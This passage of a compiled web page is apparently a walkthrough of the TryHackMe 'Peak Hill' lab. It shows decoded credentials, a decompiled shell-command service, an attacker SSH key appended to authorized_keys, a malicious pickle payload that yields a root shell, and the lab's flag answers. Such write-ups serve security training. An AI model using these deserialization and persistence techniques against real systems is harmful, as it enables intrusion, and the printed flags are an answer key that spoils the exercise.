...ssh_pass8qJh..qKX\n...ssh_pass17qLh).qMX\n...ssh_pass24qNh>.qOX   ...ssh_user3qPh..qQX    ...ssh_user4qRh,.qSX\n...ssh_pass11qTh\n.qUX    ...ssh_pass0qVX....pqW.qXX\n...ssh_pass10qYh..qZe.\n")),(0,x.kt)("pre",null,(0,x.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Peak Hill$ python3 decode_pickel.py\nSSH user: gherkin\nSSH pass: p1ckl3s_@11_@r0und_th3_w0rld\n")),(0,x.kt)("pre",null,(0,x.kt)("code",{parentName:"pre"},"gherkin@ubuntu-xenial:~$ ls -la\ntotal 16\ndrwxr-xr-x 3 gherkin gherkin 4096 Oct  8 15:24 .\ndrwxr-xr-x 4 root    root    4096 May 15 18:38 ..\ndrwx------ 2 gherkin gherkin 4096 Oct  8 15:24 .cache\n-rw-r--r-- 1 root    root    2350 May 15 18:37 cmd_service.pyc\ngherkin@ubuntu-xenial:~$\n")),(0,x.kt)("pre",null,(0,x.kt)("code",{parentName:"pre",className:"language-py"},"kali@kali:~/CTFs/tryhackme/Peak Hill$ uncompyle6 cmd_service.pyc\n# uncompyle6 version 3.7.4\n# Python bytecode 3.8 (3413)\n# Decompiled from: Python 3.8.2 (default, Apr  1 2020, 15:52:55)\n# [GCC 9.3.0]\n# Embedded file name: ./cmd_service.py\n# Compiled at: 2020-05-14 19:55:16\n# Size of source mod 2**32: 2140 bytes\nfrom Crypto.Util.number import bytes_to_long, long_to_bytes\nimport sys, textwrap, socketserver, string, readline, threading\nfrom time import *\nimport getpass, os, subprocess\nusername = long_to_bytes(1684630636)\npassword = long_to_bytes(2457564920124666544827225107428488864802762356)\n\nclass Service(socketserver.BaseRequestHandler):\n\n    def ask_creds(self):\n        username_input = self.receive(b'Username: ').strip()\n        password_input = self.receive(b'Password: ').strip()\n        print(username_input, password_input)\n        if username_input == username:\n            if password_input == password:\n                return True\n        return False\n\n    def handle(self):\n        loggedin = self.ask_creds()\n        if not loggedin:\n            self.send(b'Wrong credentials!')\n            return None\n        self.send(b'Successfully logged in!')\n        while True:\n            command = self.receive(b'Cmd: ')\n            p = subprocess.Popen(command,\n              shell=True, stdout=(subprocess.PIPE), stderr=(subprocess.PIPE))\n            self.send(p.stdout.read())\n\n    def send(self, string, newline=True):\n        if newline:\n            string = string + b'\\n'\n        self.request.sendall(string)\n\n    def receive(self, prompt=b'> '):\n        self.send(prompt, newline=False)\n        return self.request.recv(4096).strip()\n\n\nclass ThreadedService(socketserver.ThreadingMixIn, socketserver.TCPServer, socketserver.DatagramRequestHandler):\n    pass\n\n\ndef main():\n    print('Starting server...')\n    port = 7321\n    host = '0.0.0.0'\n    service = Service\n    server = ThreadedService((host, port), service)\n    server.allow_reuse_address = True\n    server_thread = threading.Thread(target=(server.serve_forever))\n    server_thread.daemon = True\n    server_thread.start()\n    print('Server started on ' + str(server.server_address) + '!')\n    while True:\n        sleep(10)\n\n\nif __name__ == '__main__':\n    main()\n# okay decompiling cmd_service.pyc\n")),(0,x.kt)("pre",null,(0,x.kt)("code",{parentName:"pre"},'kali@kali:~/CTFs/tryhackme/Peak Hill$ python3\nPython 3.8.2 (default, Apr  1 2020, 15:52:55)\n[GCC 9.3.0] on linux\nType "help", "copyright", "credits" or "license" for more information.\n>>> from Crypto.Util.number import long_to_bytes\n>>> print(long_to_bytes(1684630636))\nb\'dill\'\n>>> print(long_to_bytes(2457564920124666544827225107428488864802762356))\nb\'n3v3r_@_d1ll_m0m3nt\'\n>>>\n')),(0,x.kt)("pre",null,(0,x.kt)("code",{parentName:"pre"},'kali@kali:~/CTFs/tryhackme/Peak Hill$ nc 10.10.13.125 7321\nUsername: dill\nPassword: n3v3r_@_d1ll_m0m3nt\nSuccessfully logged in!\nCmd: ls -la\ntotal 12\ndrwxr-xr-x  2 root root 4096 May 15 18:38 .\ndrwxr-xr-x 15 root root 4096 May 15 18:38 ..\n-r-xr-x---  1 dill dill 2141 May 15 18:38 .cmd_service.py\n\nCmd: pwd\n/var/cmd\n\nCmd: whoami\ndill\n\nCmd: cd\n\nCmd: pwd\n/var/cmd\n\nCmd: cat /home/dill/user.txt\nf1e13335c47306e193212c98fc07b6a0\n\nCmd: echo "ssh-rsa XYZ= kali@kali" >> /home/dill/.ssh/authorized_keys\n')),(0,x.kt)("pre",null,(0,x.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Peak Hill$ ssh dill@10.10.13.125\nWelcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-177-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n\n28 packages can be updated.\n19 updates are security updates.\n\n\nLast login: Wed May 20 21:56:05 2020 from 10.1.122.133\ndill@ubuntu-xenial:~$ pwd\n/home/dill\ndill@ubuntu-xenial:~$ sudo -l\nMatching Defaults entries for dill on ubuntu-xenial:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser dill may run the following commands on ubuntu-xenial:\n    (ALL : ALL) NOPASSWD: /opt/peak_hill_farm/peak_hill_farm\ndill@ubuntu-xenial:~$\n")),(0,x.kt)("pre",null,(0,x.kt)("code",{parentName:"pre"},'dill@ubuntu-xenial:/opt/peak_hill_farm$ python3\nPython 3.5.2 (default, Apr 16 2020, 17:47:17)\n[GCC 5.4.0 20160609] on linux\nType "help", "copyright", "credits" or "license" for more information.\n>>> import os\n>>> import pickle\n>>> import base64\n>>> class evil_object(object):\n    def __reduce__(self... ):\n        return (os.system, (\'/bin/bash\',))...\n...\n>>> x = evil_object()\n>>> holdit = pickle.dumps(x)\n>>> base64.b64encode(holdit)\nb\'gANjcG9zaXgKc3lzdGVtCnEAWAkAAAAvYmluL2Jhc2hxAYVxAlJxAy4=\'\n>>>\ndill@ubuntu-xenial:/opt/peak_hill_farm$ sudo ./peak_hill_farm\nPeak Hill Farm 1.0 - Grow something on the Peak Hill Farm!\n\nto grow: gANjcG9zaXgKc3lzdGVtCnEAWAkAAAAvYmluL2Jhc2hxAYVxAlJxAy4=\nroot@ubuntu-xenial:/opt/peak_hill_farm#\n')),(0,x.kt)("pre",null,(0,x.kt)("code",{parentName:"pre"},'root@ubuntu-xenial:/opt/peak_hill_farm# find /root/ -name "*root.txt*" -exec cat {} \\;\ne88f0a01135c05cf0912cf4bc335ee28\n')),(0,x.kt)("ol",null,(0,x.kt)("li",{parentName:"ol"},"What is the user flag?")),(0,x.kt)("p",null,(0,x.kt)("inlineCode",{parentName:"p"},"f1e13335c47306e193212c98fc07b6a0")),(0,x.kt)("ol",{start:2},(0,x.kt)("li",{parentName:"ol"},"What is the root flag?")),(0,x.kt)("p",null,(0,x.kt)("inlineCode",{parentName:"p"},"e88f0a01135c05cf0912cf4bc335ee28")))}a.isMDXComponent=!0}}]);